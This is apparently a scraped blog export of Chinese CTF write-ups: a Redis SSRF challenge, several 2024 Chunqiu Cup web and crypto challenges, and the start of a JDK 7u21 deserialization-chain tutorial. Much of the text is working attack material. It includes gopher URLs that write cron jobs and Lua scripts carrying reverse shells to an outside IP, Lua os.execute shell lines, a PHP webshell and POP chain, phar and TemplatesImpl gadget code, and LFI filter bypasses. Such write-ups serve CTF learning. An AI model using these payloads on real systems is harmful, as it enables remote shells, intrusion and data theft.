gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/47.100.223.173/2333%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/spool/cron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 然后抓包url编码一下发包：\n然后在vps上监听一下2333端口。\n但是一直没成功，然后可以使用dict协议来看是否成功写入：\n查看这个1的内容：\n可以看出来就是一个反弹shell的操作。\n后面一直都打不成功。想了一下，以为是环境不出网，但是发现是出网的：\n继续想，可能是因为环境中都不能打定时任务，在dockerfile中都没有下载crontab这个命令：\n所以是打不了的。需要想其他的方法。\n后面我就一直看文件，想到了nginx配置是否有突破点，这个同样是在docker中给了的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root html; index index.html; } location /visit { default_type text/plain; content_by_lua_file /usr/local/openresty/nginx/lua/main.lua; } lua_code_cache off; } } 这里关键就是如下代码：\n1 lua_code_cache off; 这里将lua_code_cache设置为off，说明nginx不会缓存之前的编译效果，也就是每次发起请求，nginx都会重新编译这个lua脚本，也就是main.lua文件。\n纵观main.lua文件，可以发现是引用了visit.script文件的，那么现在就迸发出一个思路，可以尝试覆盖visit.script文件，将这个文件内容改为是一个命令执行的地方，然后重新发起请求，就可以执行这个visit.script文件，从而成功达到一次命令执行。\n写文件的话就是参照redis中的写php文件的操作。\n让gpt给了一个弹shell的命令：\n1 ##LUA_START##os.execute(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;)##LUA_END## 这里我是先尝试了sec_tool工具，但是一直打不成功，这里是可以用gopherus工具的，但是需要改一下，结果还是没打通，看了一下别人的wp，用的弹shell的命令如下：\n1 ##LUA_START##os.execute(\u0026#34;bash -c \u0026#39;sh -i \u0026amp;\u0026gt;/dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)##LUA_END## 又是这个原因，后面还是注意用更稳定的吧。\n所以直接用gopherus生成payload：\n这里是打的php文件，需要改一下payload，gopheru打这个用的RESP协议，学ssrf的时候就简单了解了，原payload：\n1 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2493%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22bash%20-c%20%27sh%20-i%20%26%3E/dev/tcp/47.100.223.173/2333%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scripts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 这里就只需要改一下文件名以及长度：\n1 2 3 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2493%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22bash%20-c%20%27sh%20-i%20%26%3E/dev/tcp/47.100.223.173/2333%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scripts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename% .. ............ 0D%0A%2412%0D%0Avisit.script%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 改的地方用点标记出来了，就是改了一下文件名以及长度。\n然后将改了后的payload 再URL编码一下发包即可：\n第一次发包：\n然后再第二次发包，点一下send即可，成功弹上shell：\n然后再执行readflag文件即可：\n最后成功得到flag。\n这里还有队友打的用于直接执行然后回显到当前页面上的lua执行命令：\n1 2 3 ##LUA_START## ngx.say(io.popen(\u0026#34;/readflag\u0026#34;):read(\u0026#34;*all\u0026#34;)) ##LUA_END## ——————————————\n","date":"2025-02-05T13:05:10+08:00","permalink":"https://fupanc-w1n.github.io/p/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025wp/","title":"软件系统安全赛2025wp"},{"content":"writeup web easy_flask【day1】 想想flask！！\n——————————\n开题一个输入框，随便输入如下回显： 一眼ssti，直接用hackbar中的payload打即可：\n得到flag。\nfile_copy【day1】 file copy\n——————\n开题如下： 随便输入/etc/passwd返回值如下：\n然后尝试了一下/flag：\n有内容。然后想了一下后端的逻辑，猜测这里是调用的copy()函数，然后随便输入，得到如下报错结果：\ncopy()函数是一个文件操作函数，可以知道这里可以打oracle侧信道，直接跑脚本即可：\n得到flag。\nGotar【day1】 一个简陋的文件管理系统，你能拿到admin用户上传的flag吗？\n————————\n看了一下官方wp，这个算是非预期的方法。\n题目给了go源码。自己审源码，没审出来什么东西，尝试过直接伪造jwt，但是没成功。然后搜文章，看到了如下文章：\nhttps://xz.aliyun.com/t/15049?time__1311=GqjxuiPYqDq0yqeqBKumxRxWqT5xn0geoD#toc-10\n里面提到了几个go语言的存在漏洞的函数，比如有目录穿越漏洞。\n但是我找了一圈没看到利用点。感觉是在文件上传这个地方有利用点，这里后端采用的archive/tar库只能解析tar后缀的压缩文件，所以这里就只能上传tar文件。想到了软链接，前面都是打的unzip软链接，这里应该也存在tar软链接，想着使用tar软链接来带出文件。找到了一篇感觉可以打的文章：\nhttps://b1ue0ceanrun.github.io/2022/07/08/justctf2022/\n但是在最关键的如何压缩tar文件没有具体说明，原文感觉是直接利用的winrar来压缩的，这里没有成功，一直没打出来，感觉就是命令出了问题。\n后面就可以搜tar软链接，如下文章：\nhttps://www.ek1ng.com/2023CrewCTFWP.html#archive-stat-viewer\n这个文章就很像了。\n可以知道基本思路，但是还是一直没打出来，找了一篇文章说怎么写软链接，其使用的命令如下：\n1 tar -cvhf ./tmp/SK_Aug_camera.tar ./gap_40_5 这个其实有一定的问题，对于tar命令的参数说明的参考文章如下：\nhttps://blog.csdn.net/u013053075/article/details/103117341\n里面说到了-h选项的：\n也就是说这里压缩成tar包时会将我使用ln -s命令指定的软链接的文件中的内容直接压缩在里面，而不是将软链接的指向压缩在里面，但是我们真正想要利用的是第二个，所以这里并不能加上-h选项，所以最后尝试的命令如下：\n1 tar -cvf 1234.tar passwd 如下执行即可：\n然后上传1234.tar文件，如下回显： 说是已经有了软链接，那么现在访问一下给的路径，什么都没有，但是这里的2是一个目录，所以可以尝试一下目录穿越：\n1 tar -cvf 1234.tar ../../passwd 还是没打出来，后来发现是tar版本的问题，压缩时会自动去除../，后面多注意一下。\n比赛结束找晨曦师傅要了一下wp。最后没复现出来，环境关了。\n非预期是打的tar软链接，需要目录穿越一下，这里使用的tar目录的选项为：\n1 2 ln -s /flag flag tar cf a3.tar ../../flag 官网wp是可以目录穿越写文件，然后覆盖掉.env文件里面的JWT_SECRET，这样可以实现admin用户伪造，可以直接在download页面读取到flag。\n贴一个官方wp：\n《2024春秋杯冬季赛第一天题目部分解析》\neasy_ser【day2】 简单的反序列化来哩\n————————\n一道php反序列化的题，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 听说pop挺好玩的 \u0026lt;?php //error_reporting(0); function PassWAF1($data){ $BlackList = array(\u0026#34;eval\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;assert\u0026#34;, \u0026#34;phpinfo\u0026#34;, \u0026#34;shell_exec\u0026#34;, \u0026#34;pcntl_exec\u0026#34;, \u0026#34;passthru\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;putenv\u0026#34;); foreach ($BlackList as $value) { if (preg_match(\u0026#34;/\u0026#34; . $value . \u0026#34;/im\u0026#34;, $data)) { return true; } } return false; } function PassWAF2($str){ $output = \u0026#39;\u0026#39;; $count = 0; foreach (str_split($str, 16) as $v) { $hex_string = implode(\u0026#39; \u0026#39;, str_split(bin2hex($v), 4)); $ascii_string = \u0026#39;\u0026#39;; foreach (str_split($v) as $c) { $ascii_string .= (($c \u0026lt; \u0026#39; \u0026#39; || $c \u0026gt; \u0026#39;~\u0026#39;) ? \u0026#39;.\u0026#39; : $c); } $output .= sprintf(\u0026#34;%08x: %-40s %-16s\\n\u0026#34;, $count, $hex_string, $ascii_string); $count += 16; } return $output; } function PassWAF3($data){ $BlackList = array(\u0026#34;\\.\\.\u0026#34;, \u0026#34;\\/\u0026#34;); foreach ($BlackList as $value) { if (preg_match(\u0026#34;/\u0026#34; . $value . \u0026#34;/im\u0026#34;, $data)) { return true; } } return false; } function Base64Decode($s){ $decodeStr = base64_decode($s); if (is_bool($decodeStr)) { echo \u0026#34;gg\u0026#34;; exit(-1); } return $decodeStr; } class STU{ public $stu; public function __construct($stu){ $this-\u0026gt;stu = $stu; } public function __invoke(){ echo $this-\u0026gt;stu; } } class SDU{ public $Dazhuan; public function __wakeup(){ $Dazhuan = $this-\u0026gt;Dazhuan; $Dazhuan(); } } class CTF{ public $hackman; public $filename; public function __toString(){ $data = Base64Decode($this-\u0026gt;hackman); $filename = $this-\u0026gt;filename; if (PassWAF1($data)) { echo \u0026#34;so dirty\u0026#34;; return; } if (PassWAF3($filename)) { echo \u0026#34;just so so?\u0026#34;; return; } file_put_contents($filename, PassWAF2($data)); echo \u0026#34;hack?\u0026#34;; return \u0026#34;really!\u0026#34;; } public function __destruct(){ echo \u0026#34;bye\u0026#34;; } } $give = $_POST[\u0026#39;data\u0026#39;]; if (isset($_POST[\u0026#39;data\u0026#39;])) { unserialize($give); } else { echo \u0026#34;\u0026lt;center\u0026gt;听说pop挺好玩的\u0026lt;/center\u0026gt;\u0026#34;; highlight_file(__FILE__); } 其中几个点：\n1 file_put_contents($filename, PassWAF2($data)); 可以知道是写文件，这里就可以写马。\n写马的话就需要注意定义的函数以及调用，比较需要关注的就如下函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function PassWAF2($str){ $output = \u0026#39;\u0026#39;; $count = 0; foreach (str_split($str, 16) as $v) { $hex_string = implode(\u0026#39; \u0026#39;, str_split(bin2hex($v), 4)); $ascii_string = \u0026#39;\u0026#39;; foreach (str_split($v) as $c) { $ascii_string .= (($c \u0026lt; \u0026#39; \u0026#39; || $c \u0026gt; \u0026#39;~\u0026#39;) ? \u0026#39;.\u0026#39; : $c); } $output .= sprintf(\u0026#34;%08x: %-40s %-16s\\n\u0026#34;, $count, $hex_string, $ascii_string); $count += 16; } return $output; } 这里会将我输入的内容编写成一个类似16进制格式的那种内容，然后才会写入文件，如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php function PassWAF2($str){ $output = \u0026#39;\u0026#39;; $count = 0; foreach (str_split($str, 16) as $v) { $hex_string = implode(\u0026#39; \u0026#39;, str_split(bin2hex($v), 4)); $ascii_string = \u0026#39;\u0026#39;; foreach (str_split($v) as $c) { $ascii_string .= (($c \u0026lt; \u0026#39; \u0026#39; || $c \u0026gt; \u0026#39;~\u0026#39;) ? \u0026#39;.\u0026#39; : $c); } $output .= sprintf(\u0026#34;%08x: %-40s %-16s\\n\u0026#34;, $count, $hex_string, $ascii_string); $count += 16; } return $output; } $a=\u0026#34;\\\u0026lt;\\?php \\$_GET[0](\\$_POST[1])\\?\\\u0026gt;\u0026#34;; $filename = \u0026#34;123456.php\u0026#34;; file_put_contents($filename, PassWAF2($a)); 运行后123456.php文件内容为：\n1 2 00000000: 5c3c 5c3f 7068 7020 245f 4745 545b 305d \\\u0026lt;\\?php $_GET[0] 00000010: 2824 5f50 4f53 545b 315d 295c 3f5c 3e ($_POST[1])\\?\\\u0026gt; 可以看到是将代码分割开了，很容易想到，缩短payload长度，让其在第一行就会被全部解析，想到了一句话木马最短版：\n1 \u0026lt;?=`$_GET[0]`;?\u0026gt; 经测试，可以成功：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php function PassWAF2($str){ $output = \u0026#39;\u0026#39;; $count = 0; foreach (str_split($str, 16) as $v) { $hex_string = implode(\u0026#39; \u0026#39;, str_split(bin2hex($v), 4)); $ascii_string = \u0026#39;\u0026#39;; foreach (str_split($v) as $c) { $ascii_string .= (($c \u0026lt; \u0026#39; \u0026#39; || $c \u0026gt; \u0026#39;~\u0026#39;) ? \u0026#39;.\u0026#39; : $c); } $output .= sprintf(\u0026#34;%08x: %-40s %-16s\\n\u0026#34;, $count, $hex_string, $ascii_string); $count += 16; } return $output; } $a=\u0026#39;\u0026lt;?=`$_GET[0]`;?\u0026gt;\u0026#39;; $filename = \u0026#34;123456.php\u0026#34;; file_put_contents($filename, PassWAF2($a)); 所以现在直接写链子即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 听说pop挺好玩的 \u0026lt;?php class STU{ public $stu; public function __invoke(){ echo $this-\u0026gt;stu; } } class SDU{ public $Dazhuan; public function __wakeup(){ $Dazhuan = $this-\u0026gt;Dazhuan; $Dazhuan(); } } class CTF{ public $hackman; public $filename; public function __toString(){ $data = Base64Decode($this-\u0026gt;hackman); $filename = $this-\u0026gt;filename; if (PassWAF1($data)) { echo \u0026#34;so dirty\u0026#34;; return; } if (PassWAF3($filename)) { echo \u0026#34;just so so?\u0026#34;; return; } file_put_contents($filename, PassWAF2($data)); echo \u0026#34;hack?\u0026#34;; return \u0026#34;really!\u0026#34;; } public function __destruct(){ echo \u0026#34;bye\u0026#34;; } } $a= new SDU(); $a-\u0026gt;Dazhuan=new STU(); $a-\u0026gt;Dazhuan-\u0026gt;stu=new CTF(); $a-\u0026gt;Dazhuan-\u0026gt;stu-\u0026gt;filename=\u0026#34;shell.php\u0026#34;; $a-\u0026gt;Dazhuan-\u0026gt;stu-\u0026gt;hackman=\u0026#39;PD89YCRfR0VUWzBdYDs/Pg==\u0026#39;; echo serialize($a); 得到链子：\n1 O:3:\u0026#34;SDU\u0026#34;:1:{s:7:\u0026#34;Dazhuan\u0026#34;;O:3:\u0026#34;STU\u0026#34;:1:{s:3:\u0026#34;stu\u0026#34;;O:3:\u0026#34;CTF\u0026#34;:2:{s:7:\u0026#34;hackman\u0026#34;;s:24:\u0026#34;PD89YCRfR0VUWzBdYDs/Pg==\u0026#34;;s:8:\u0026#34;filename\u0026#34;;s:9:\u0026#34;shell.php\u0026#34;;}}} 然后就是打就行了，传入数据后访问shell.php文件，进行命令执行读flag即可：\n得到flag。\nb0okshelf【day2】 读万卷书，行万里路。老师想让你做一个共享图书平台，但是为了开源节流，不采用数据库，你用了一些神奇的办法……\n————————\n开题，进行信息收集。\n后端是php：\n扫一下目录： 扫到一个backup.zip和一个robots.txt，但是robots.txt其实就是说的backup.zip文件。下载这个backup.zip文件，里面就是源码，简单来说就是审计源码的操作。\n源码还是挺简单的。简单说说考点吧：\n先是字符串逃逸（增多）来任意写马，连上木马，但是有open_basedir的限制。再然后还有disable_function的限制，这里可以使用蚁剑工具的fpm来绕，还可以使用CN-EXT (CVE-2024-2961)弹个shell来绕，记住就行。这里就注意一下，绕过disable_funtion还有其他的方法。\n最后有个sudo的date提权。\n环境关了，具体解法看官方wp吧：\n《2024春秋杯冬季赛第二天题目部分解析》\neasy_code【day3】 尝试绕过呢\n题目提示：构造整数溢出，以及php://filter过滤器去绕过读取read.php\n——————————\n本来是day2的题，但是不知道为啥在day2最后几天撤了放day3了。\n开题信息收集拿到是php后端，然后扫目录扫出来robots.txt文件，里面防爬gogogo.php，访问这个页面，得到如下php代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;?php header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); highlight_file(__FILE__); $allowedFiles = [\u0026#39;read.php\u0026#39;, \u0026#39;index.php\u0026#39;]; $ctfer = $_GET[\u0026#39;ctfer\u0026#39;]?? null; if ($ctfer === null) { die(\u0026#34;error 0!\u0026#34;); } if (!is_numeric($ctfer)) { die(\u0026#34;error 1!\u0026#34;); } if ($ctfer!= 667) { die(\u0026#34;error 2!\u0026#34;); } //溢出 if (strpos(strval($ctfer), \u0026#39;7\u0026#39;)!== false) { die(\u0026#34;error 3!\u0026#34;); } $file = $_GET[\u0026#34;file\u0026#34;]; if ($_COOKIE[\u0026#39;pass\u0026#39;] == \u0026#34;admin\u0026#34;) { if (isset($file)) { // 改进的正则表达式，检查是否不存在 base|rot13|input|data|flag|file|base64 字符串 if (preg_match(\u0026#34;/^(?:.*(?:base|rot13|input|data|flag|file|2|5|base64|log|proc|self|env).*)$/i\u0026#34;, $file)) { // 先检查文件是否在允许的列表中 echo \u0026#34;prohibited prohibited!!!!\u0026#34;; } else { echo \u0026#34;试试read.php\u0026#34;; include($file); } } } ?\u0026gt; 试试read.php 前面的整数绕过不是很懂，本来以为是考的如下文章的知识点：\n《Hackergame 2021 Web题2 卖瓜 题解（PHP整型溢出漏洞）》\n但是没怎么构造出来。看了一下其他师傅的wp，大概就是php中存在一个浮点精度问题，当浮点精度过高，会导致上溢。所以这里使用下面这个可以绕：\n1 ?ctfer=666.99999999999999999999999999 后面就是一个简单的filter过滤器的利用，直接如下读即可：\n1 ?ctfer=666.99999999999999999999999999\u0026amp;file=php://filter/convert.iconv.utf8.utf16/resource=read.php 拿到read.php文件内容：\n1 \u0026lt;?php $flag = \u0026#34;ZmxhZ3tkOTFlYTIzZTkyN2IwZTJkY2E2NDYyNGNmNGM4NjdjYX0=\u0026#34; ?\u0026gt; 拿去解码得到flag：\n1 flag{d91ea23e927b0e2dca64624cf4c867ca} ——————\neasy_php【day3】 如何触发phar呢\n————————\n不多说，很像一道原题：SWPUCTF 2018]SimplePHP\n改了一点。给了源码，但是事先我是不知道的，这里就简单记录一下踩的坑，首先是文件名的问题，这里我基础不牢，范了一个非常基础的错误，源码中对上传的文件有如下处理：\n1 2 3 4 5 6 $filename = md5($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;].$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]).\u0026#34;.jpg\u0026#34;; //mkdir(\u0026#34;upload\u0026#34;,0777); if(file_exists(\u0026#34;upload/\u0026#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $filename); 可以知道是将文件名重写并指定了后缀，这里是将上传的文件名（比如shell.gif）和访问ip（你的外网Ip）拼接然后md5加密生成的文件名。这里为了获取到文件名卡了很久，但是这里应该要注意一个代码：\n1 mkdir(\u0026#34;upload\u0026#34;,0777); 虽然是被注释了的，但是这里也是变相表明了一些东西，这里的upload是可以访问的，就算是www-data权限。所以这里在上传了文件后是可以知道文件名的。\n第二个点就是读取flag的地方，在file.php中也是注释了一个代码：\n1 #ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/var/www/html/phar2\u0026#39;); 就是可以读取任何目录的文件。源码给了一个假的flag.php，真的是在根目录下的/flag。\n最后，这里的生成phar的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 \u0026lt;?php class Chunqiu { public $test; public $str; public function __destruct() { $this-\u0026gt;test = $this-\u0026gt;str; echo $this-\u0026gt;test; } } class Show { public $source; public $str; public function __toString() { $content = $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; return $content; } public function __set($key,$value) { $this-\u0026gt;$key = $value; } public function _show() { if(preg_match(\u0026#39;/http|https|file:|gopher|dict|\\.\\.|f1ag/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker!\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker~\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $file; public $params; public function __get($key) { return $this-\u0026gt;get($key); } public function get($key) { if(isset($this-\u0026gt;params[$key])) { $value = $this-\u0026gt;params[$key]; } else { $value = \u0026#34;index.php\u0026#34;; } return $this-\u0026gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } $a=new Chunqiu(); $a-\u0026gt;str=new Show(); $a-\u0026gt;str-\u0026gt;str[\u0026#39;str\u0026#39;]=new Test(); $a-\u0026gt;str-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;params[\u0026#34;source\u0026#34;]=\u0026#34;/flag\u0026#34;; $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //.phar文件，后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER();\u0026lt;!-- ?\u0026gt;\u0026#34;); //设置stub，固定的 $phar-\u0026gt;setMetadata($a); //将自定义的meta-data存入manifest --这里注意变通 $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 生成的phar然后改成gif后缀上传即可。然后拿到文件名，使用phar协议触发即可。\n其他wp就看看官方wp即可：\n《春秋杯WP | 2024春秋杯冬季赛第三天题目部分解析》\ncrypto 通往哈希的旅程 在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串\u0026quot;ca12fd8250972ec363a16593356abb1f3cf3a16d\u0026quot;，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}）\n哈希爆破，让gpt根据这个写个脚本即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import hashlib def generate_hash(number): # 假设哈希算法是SHA1 return hashlib.sha1(number.encode()).hexdigest() def crack_hash(target_hash): # 生成所有11位的电话号码 for i in range(18810000000, 18899999999): phone_number = str(i) # 生成该电话号码的哈希值 phone_hash = generate_hash(phone_number) # 如果哈希值匹配，则返回该电话号码 if phone_hash == target_hash: return phone_number return None if __name__ == \u0026#34;__main__\u0026#34;: target_hash = \u0026#34;ca12fd8250972ec363a16593356abb1f3cf3a16d\u0026#34; result = crack_hash(target_hash) if result: print(f\u0026#34;flag{{{result}}}\u0026#34;) else: print(\u0026#34;未能找到匹配的电话号码\u0026#34;) 得到flag：\n1 flag{18876011645} ","date":"2025-01-22T14:20:20+08:00","permalink":"https://fupanc-w1n.github.io/p/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/","title":"2024春秋杯冬季赛"},{"content":"JDK 7u21 7u21这条链不需要任何依赖，完全是靠 java 原生类来进行利用。\n影响版本：JDK \u0026lt;= 7u21\n测试环境：\nJDK 7u21 idea需要改配置，我前面都是1.8，这里改成JDK7即可，按照下面这个文章来该即可：\nhttps://blog.csdn.net/qq_41813208/article/details/107784268\nhttps://blog.csdn.net/wz1509/article/details/141857535\n前置说明 铺垫 这里的JDK7u21还是利用的动态加载字节码，这里可以获取到一个类的方法，先简单给个铺垫知识，在前面CC链的学习其实也用过，我们可以启用一次动态加载字节码的方法有：\nnewTransformer()： getOutputProperties()： 其实直接用getTransletInstance()方法应该也可以，但是不是很好利用。\n上面说的两个方法也定义于Templates.java接口类，如下： 也是前面用过的。\nAnnotationInvocationHandler 在前面的CC1的LazyMap链中，就利用到了这个类，在那里利用到了这个类的invoke()方法，为了调用到get方法：\n但是在这里，我们要利用的是这个类的equalsImpl()方法，同样的是在这个类的invoke()方法中利用，如上图片标注。\nequalsImpl() 现在再来看这个equalsImpl()方法： 这里调用了invoke()方法，需要var1不是AnnotationInvocationHandler类实例并且需要为type变量的一个类实例才能调用，再来跟进一下前面var2的getMemberMethods()方法：\n这里就是获取到type变量里的方法，在AnnotationInvocationHandler类的type变量定义：\n我们可以使用反射获取AnnotationInvocationHandler类的构造方法，这样就可以给这个变量定值，所以我们可以尝试将这里的type变量赋值为Templates.class接口类，这样就可以直接获取到想利用的方法。\n参考CC1，现在这里就可以再次尝试使用动态代理来调用到这个AnnotationInvocationHandler类的invoke()方法，进而进行其他操作。\nHashMap 这里为什么会用到HashMap呢，这是因为这个类的readObject()方法中对代理对象调用了它的方法，如下： 进入这个putForCreate()方法： 只要满足前面的条件，这里就可以成功对这个key调用equals()方法，只要我们将这个key设置为AnnotationInvocationHandler的代理对象，就可以成功调用到这个AnnotationInvocationHandler类的invoke()方法\n同理感觉HashSet，Hashtable也能构造，只要能使调用的方法为equals()方法即可调用equalsImpl()方法： 简单说明一下参数问题：key.equals(k);，当跳转到AnnotationInvocationHandler类的invoke()方法时，这里对应的参数分别为\nvar2（方法名）：equals va3（参数）：k 所以结合前面invoke()方法，这里的k需要为TemplatesImpl类的实例，对应的就是前一个put进的值：\n这张图说的很清楚了，所以我们需要put进两个值，并且前一个需要为templateImpl类的实例，另一个为代理对象。\n现在可以敲定基本框架了，大概想一下流程，反序：\n放键值对到其中。 调用到AnntationInvocationHandler的invoke()方法 调用equalsImpl()方法 调用getMemberMethods()方法获取到type的class对象中的方法。 执行invoke来动态加载字节码 攻击构造 HashMap 基本盘：\nTest.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package jdk.local; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就是看如何将这个配置好了的恶意字节码能被利用到。\n反序列化部分 先从反序分析起：\n这里就是从序列化数据中提取出键值，然后调用putForCreate()方法尝试将其放入键值表中，继续跟进这个putForCeate()方法： 重点还是标注出来的地方。\n首先就是hash值的设定，那里的逻辑就是如果 key为null，那么hash值就为0，否则就是调用hash()方法来计算key的的哈希值。 跟进一下这里的hash()方法，算法如下：\n其次就是后面的if条件内的判断。java中的\u0026amp;\u0026amp;运算符会按前后顺序执行，并且需要前面的真才会执行后面。而后面的||运算符只要一个为真即可。 所以在这里我们需要满足前面的hash值条件为真。就可以执行后面的语句。\n问题一（hash值） 